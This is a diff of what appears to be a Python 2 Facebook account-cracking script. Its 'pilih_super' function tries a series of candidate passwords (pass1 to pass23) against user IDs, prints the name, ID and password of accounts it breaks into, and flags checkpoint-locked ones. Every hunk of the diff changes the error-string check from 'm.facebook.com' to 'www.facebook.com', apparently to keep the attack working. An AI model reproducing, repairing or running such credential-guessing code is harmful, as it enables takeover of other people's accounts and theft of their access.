@@ -373,7 +373,7 @@ def pilih_super():
 				print '\x1b[1;96m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;92m' + pass1 + '\n'
 				oks.append(user+pass1)
 			else:
-				if 'm.facebook.com' in q["error_msg"]:
+				if 'www.facebook.com' in q["error_msg"]:
 					print '\x1b[1;96m[✖] \x1b[1;93m7Days'
 					print '\x1b[1;96m[✺] \x1b[1;97mName \x1b[1;91m    : \x1b[1;93m' + b['name']
 					print '\x1b[1;96m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;93m' + user
@@ -393,7 +393,7 @@ def pilih_super():
 						print '\x1b[1;96m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;92m' + pass2 + '\n'
 						oks.append(user+pass2)
 					else:
-						if 'm.facebook.com' in q["error_msg"]:
+						if 'www.facebook.com' in q["error_msg"]:
 							print '\x1b[1;96m[✖] \x1b[1;93m7Days'
 							print '\x1b[1;96m[✺] \x1b[1;97mName \x1b[1;91m    : \x1b[1;93m' + b['name']
 							print '\x1b[1;96m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;93m' + user
@@ -413,7 +413,7 @@ def pilih_super():
 								print '\x1b[1;96m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;92m' + pass3 + '\n'
 								oks.append(user+pass3)
 							else:
-								if 'm.facebook.com' in q["error_msg"]:
+								if 'www.facebook.com' in q["error_msg"]:
 									print '\x1b[1;96m[✖] \x1b[1;93m7Days'
 									print '\x1b[1;96m[✺] \x1b[1;97mName \x1b[1;91m    : \x1b[1;93m' + b['name']
 									print '\x1b[1;96m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;93m' + user
@@ -433,7 +433,7 @@ def pilih_super():
 										print '\x1b[1;96m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;92m' + pass4 + '\n'
 										oks.append(user+pass4)
 									else:
-										if 'm.facebook.com' in q["error_msg"]:
+										if 'www.facebook.com' in q["error_msg"]:
 											print '\x1b[1;96m[✖] \x1b[1;93m7Days'
 											print '\x1b[1;96m[✺] \x1b[1;97mName \x1b[1;91m    : \x1b[1;93m' + b['name']
 											print '\x1b[1;96m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;93m' + user
@@ -454,7 +454,7 @@ def pilih_super():
 												print '\x1b[1;96m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;92m' + pass5 + '\n'
 												oks.append(user+pass5)
 											else:
-												if 'm.facebook.com' in q["error_msg"]:
+												if 'www.facebook.com' in q["error_msg"]:
 													print '\x1b[1;96m[✖] \x1b[1;93m7Days'
 													print '\x1b[1;96m[✺] \x1b[1;97mName \x1b[1;91m    : \x1b[1;93m' + b['name']
 													print '\x1b[1;96m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;93m' + user
@@ -474,7 +474,7 @@ def pilih_super():
 														print '\x1b[1;96m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;92m' + pass6 + '\n'
 														oks.append(user+pass6)
 													else:
-														if 'm.facebook.com' in q["error_msg"]:
+														if 'www.facebook.com' in q["error_msg"]:
 															print '\x1b[1;96m[✖] \x1b[1;93m7Days'
 															print '\x1b[1;96m[✺] \x1b[1;97mName \x1b[1;91m    : \x1b[1;93m' + b['name']
 															print '\x1b[1;96m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;93m' + user
@@ -494,7 +494,7 @@ def pilih_super():
 														                print '\x1b[1;96m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;92m' + pass7 + '\n'
 														                oks.append(user+pass7)
 													                else:
-														                if 'm.facebook.com' in q["error_msg"]:
+														                if 'www.facebook.com' in q["error_msg"]:
 															                print '\x1b[1;96m[✖] \x1b[1;93m7Days'
 															                print '\x1b[1;96m[✺] \x1b[1;97mName \x1b[1;91m    : \x1b[1;93m' + b['name']
 															                print '\x1b[1;96m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;93m' + user
@@ -514,7 +514,7 @@ def pilih_super():
 														                                print '\x1b[1;96m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;92m' + pass8 + '\n'
 														                                oks.append(user+pass8)
 													                                else:
-														                                if 'm.facebook.com' in q["error_msg"]:
+														                                if 'www.facebook.com' in q["error_msg"]:
 															                                print '\x1b[1;96m[✖] \x1b[1;93m7Days'
 															                                print '\x1b[1;96m[✺] \x1b[1;97mName \x1b[1;91m    : \x1b[1;93m' + b['name']
 															                                print '\x1b[1;96m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;93m' + user
@@ -534,7 +534,7 @@ def pilih_super():
 														                                                print '\x1b[1;96m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;92m' + pass9 + '\n'
 														                                                oks.append(user+pass9)
 													                                                else:
-														                                                if 'm.facebook.com' in q["error_msg"]:
+														                                                if 'www.facebook.com' in q["error_msg"]:
 															                                                print '\x1b[1;96m[✖] \x1b[1;93m7Days'
 															                                                print '\x1b[1;96m[✺] \x1b[1;97mName \x1b[1;91m    : \x1b[1;93m' + b['name']
 															                                                print '\x1b[1;96m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;93m' + user
@@ -554,7 +554,7 @@ def pilih_super():
 														                                                                print '\x1b[1;96m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;92m' + pass10 + '\n'
 														                                                                oks.append(user+pass10)
 													                                                                else:
-														                                                                if 'm.facebook.com' in q["error_msg"]:
+														                                                                if 'www.facebook.com' in q["error_msg"]:
 															                                                                print '\x1b[1;96m[✖] \x1b[1;93m7Days'
 															                                                                print '\x1b[1;96m[✺] \x1b[1;97mName \x1b[1;91m    : \x1b[1;93m' + b['name']
 															                                                                print '\x1b[1;96m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;93m' + user
@@ -574,7 +574,7 @@ def pilih_super():
 														                                                                                print '\x1b[1;96m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;92m' + pass11 + '\n'
 														                                                                                oks.append(user+pass11)
 													                                                                                else:
-														                                                                                if 'm.facebook.com' in q["error_msg"]:
+														                                                                                if 'www.facebook.com' in q["error_msg"]:
 															                                                                                print '\x1b[1;96m[✖] \x1b[1;93m7Days'
 															                                                                                print '\x1b[1;96m[✺] \x1b[1;97mName \x1b[1;91m    : \x1b[1;93m' + b['name']
 															                                                                                print '\x1b[1;96m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;93m' + user
@@ -594,7 +594,7 @@ def pilih_super():
 														                                                                                                print '\x1b[1;96m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;92m' + pass12 + '\n'
 														                                                                                                oks.append(user+pass12)
 													                                                                                                else:
-														                                                                                                if 'm.facebook.com' in q["error_msg"]:
+														                                                                                                if 'www.facebook.com' in q["error_msg"]:
 															                                                                                                print '\x1b[1;96m[✖] \x1b[1;93m7Days'
 															                                                                                                print '\x1b[1;96m[✺] \x1b[1;97mName \x1b[1;91m    : \x1b[1;93m' + b['name']
 															                                                                                                print '\x1b[1;96m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;93m' + user
@@ -614,7 +614,7 @@ def pilih_super():
 														                                                                                                                print '\x1b[1;96m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;92m' + pass13 + '\n'
 														                                                                                                                oks.append(user+pass13)
 													                                                                                                                else:
-														                                                                                                                if 'm.facebook.com' in q["error_msg"]:
+														                                                                                                                if 'www.facebook.com' in q["error_msg"]:
 															                                                                                                                print '\x1b[1;96m[✖] \x1b[1;93m7Days'
 															                                                                                                                print '\x1b[1;96m[✺] \x1b[1;97mName \x1b[1;91m    : \x1b[1;93m' + b['name']
 															                                                                                                                print '\x1b[1;96m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;93m' + user
@@ -634,7 +634,7 @@ def pilih_super():
 														                                                                                                                                print '\x1b[1;96m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;92m' + pass14 + '\n'
 														                                                                                                                                oks.append(user+pass14)
 													                                                                                                                                else:
-														                                                                                                                                if 'm.facebook.com' in q["error_msg"]:
+														                                                                                                                                if 'www.facebook.com' in q["error_msg"]:
 															                                                                                                                                print '\x1b[1;96m[✖] \x1b[1;93m7Days'
 															                                                                                                                                print '\x1b[1;96m[✺] \x1b[1;97mName \x1b[1;91m    : \x1b[1;93m' + b['name']
 															                                                                                                                                print '\x1b[1;96m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;93m' + user
@@ -654,7 +654,7 @@ def pilih_super():
 														                                                                                                                                                print '\x1b[1;96m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;92m' + pass15 + '\n'
 														                                                                                                                                                oks.append(user+pass15)
 													                                                                                                                                                else:
-														                                                                                                                                                if 'm.facebook.com' in q["error_msg"]:
+														                                                                                                                                                if 'www.facebook.com' in q["error_msg"]:
 															                                                                                                                                                print '\x1b[1;96m[✖] \x1b[1;93m7Days'
 															                                                                                                                                                print '\x1b[1;96m[✺] \x1b[1;97mName \x1b[1;91m    : \x1b[1;93m' + b['name']
 															                                                                                                                                                print '\x1b[1;96m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;93m' + user
@@ -674,7 +674,7 @@ def pilih_super():
 														                                                                                                                                                                print '\x1b[1;96m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;92m' + pass16 + '\n'
 														                                                                                                                                                                oks.append(user+pass16)
 													                                                                                                                                                                else:
-														                                                                                                                                                                if 'm.facebook.com' in q["error_msg"]:
+														                                                                                                                                                                if 'www.facebook.com' in q["error_msg"]:
 															                                                                                                                                                                print '\x1b[1;96m[✖] \x1b[1;93m7Days'
 															                                                                                                                                                                print '\x1b[1;96m[✺] \x1b[1;97mName \x1b[1;91m    : \x1b[1;93m' + b['name']
 															                                                                                                                                                                print '\x1b[1;96m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;93m' + user
@@ -694,7 +694,7 @@ def pilih_super():
 														                                                                                                                                                                                print '\x1b[1;96m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;92m' + pass17 + '\n'
 														                                                                                                                                                                                oks.append(user+pass17)
 													                                                                                                                                                                                else:
-														                                                                                                                                                                                if 'm.facebook.com' in q["error_msg"]:
+														                                                                                                                                                                                if 'www.facebook.com' in q["error_msg"]:
 															                                                                                                                                                                                print '\x1b[1;96m[✖] \x1b[1;93m7Days'
 															                                                                                                                                                                                print '\x1b[1;96m[✺] \x1b[1;97mName \x1b[1;91m    : \x1b[1;93m' + b['name']
 															                                                                                                                                                                                print '\x1b[1;96m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;93m' + user
@@ -714,7 +714,7 @@ def pilih_super():
 														                                                                                                                                                                                                print '\x1b[1;96m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;92m' + pass18 + '\n'
 														                                                                                                                                                                                                oks.append(user+pass18)
 													                                                                                                                                                                                                else:
-														                                                                                                                                                                                                if 'm.facebook.com' in q["error_msg"]:
+														                                                                                                                                                                                                if 'www.facebook.com' in q["error_msg"]:
 															                                                                                                                                                                                                print '\x1b[1;96m[✖] \x1b[1;93m7Days'
 															                                                                                                                                                                                                print '\x1b[1;96m[✺] \x1b[1;97mName \x1b[1;91m    : \x1b[1;93m' + b['name']
 															                                                                                                                                                                                                print '\x1b[1;96m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;93m' + user
@@ -734,7 +734,7 @@ def pilih_super():
 														                                                                                                                                                                                                                print '\x1b[1;96m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;92m' + pass19 + '\n'
 														                                                                                                                                                                                                                oks.append(user+pass19)
 													                                                                                                                                                                                                                else:
-														                                                                                                                                                                                                                if 'm.facebook.com' in q["error_msg"]:
+														                                                                                                                                                                                                                if 'www.facebook.com' in q["error_msg"]:
 															                                                                                                                                                                                                                print '\x1b[1;96m[✖] \x1b[1;93m7Days'
 															                                                                                                                                                                                                                print '\x1b[1;96m[✺] \x1b[1;97mName \x1b[1;91m    : \x1b[1;93m' + b['name']
 															                                                                                                                                                                                                                print '\x1b[1;96m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;93m' + user
@@ -754,7 +754,7 @@ def pilih_super():
 														                                                                                                                                                                                                                                print '\x1b[1;96m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;92m' + pass20 + '\n'
 														                                                                                                                                                                                                                                oks.append(user+pass20)
 													                                                                                                                                                                                                                                else:
-														                                                                                                                                                                                                                                if 'm.facebook.com' in q["error_msg"]:
+														                                                                                                                                                                                                                                if 'www.facebook.com' in q["error_msg"]:
 															                                                                                                                                                                                                                                print '\x1b[1;96m[✖] \x1b[1;93m7Days'
 															                                                                                                                                                                                                                                print '\x1b[1;96m[✺] \x1b[1;97mName \x1b[1;91m    : \x1b[1;93m' + b['name']
 															                                                                                                                                                                                                                                print '\x1b[1;96m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;93m' + user
@@ -774,7 +774,7 @@ def pilih_super():
 														                                                                                                                                                                                                                                                print '\x1b[1;96m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;92m' + pass21 + '\n'
 														                                                                                                                                                                                                                                                oks.append(user+pass21)
 													                                                                                                                                                                                                                                                else:
-														                                                                                                                                                                                                                                                if 'm.facebook.com' in q["error_msg"]:
+														                                                                                                                                                                                                                                                if 'www.facebook.com' in q["error_msg"]:
 															                                                                                                                                                                                                                                                print '\x1b[1;96m[✖] \x1b[1;93m7Days'
 															                                                                                                                                                                                                                                                print '\x1b[1;96m[✺] \x1b[1;97mName \x1b[1;91m    : \x1b[1;93m' + b['name']
 															                                                                                                                                                                                                                                                print '\x1b[1;96m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;93m' + user
@@ -794,7 +794,7 @@ def pilih_super():
 														                                                                                                                                                                                                                                                                print '\x1b[1;96m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;92m' + pass22 + '\n'
 														                                                                                                                                                                                                                                                                oks.append(user+pass22)
 													                                                                                                                                                                                                                                                                else:
-														                                                                                                                                                                                                                                                                if 'm.facebook.com' in q["error_msg"]:
+														                                                                                                                                                                                                                                                                if 'www.facebook.com' in q["error_msg"]:
 															                                                                                                                                                                                                                                                                print '\x1b[1;96m[✖] \x1b[1;93m7Days'
 															                                                                                                                                                                                                                                                                print '\x1b[1;96m[✺] \x1b[1;97mName \x1b[1;91m    : \x1b[1;93m' + b['name']
 															                                                                                                                                                                                                                                                                print '\x1b[1;96m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;93m' + user
@@ -814,7 +814,7 @@ def pilih_super():
 														                                                                                                                                                                                                                                                                                print '\x1b[1;96m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;92m' + pass23 + '\n'
 														                                                                                                                                                                                                                                                                                oks.append(user+pass23)
 													                                                                                                                                                                                                                                                                                else:
-														                                                                                                                                                                                                                                                                                if 'm.facebook.com' in q["error_msg"]:
+														                                                                                                                                                                                                                                                                                if 'www.facebook.com' in q["error_msg"]:
 															                                                                                                                                                                                                                                                                                print '\x1b[1;96m[✖] \x1b[1;93m7Days'
 															                                                                                                                                                                                                                                                                                print '\x1b[1;96m[✺] \x1b[1;97mName \x1b[1;91m    : \x1b[1;93m' + b['name']
 															                                                                                                                                                                                                                                                                                print '\x1b[1;96m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;93m' + user
